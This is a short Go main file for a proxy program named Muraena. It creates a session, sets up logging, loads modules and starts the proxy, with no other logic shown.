package main

import (
	"fmt"
	"os"

	"github.com/muraenateam/muraena/core/proxy"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module"
	"github.com/muraenateam/muraena/session"
)

func main() {
	sess, err := session.New()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// Init Log
	log.Init(sess.Options, sess.Config.Log.Enabled, sess.Config.Log.FilePath)

	// Load all modules
	module.LoadModules(sess)

	// Run Muraena
	proxy.Run(sess)
}
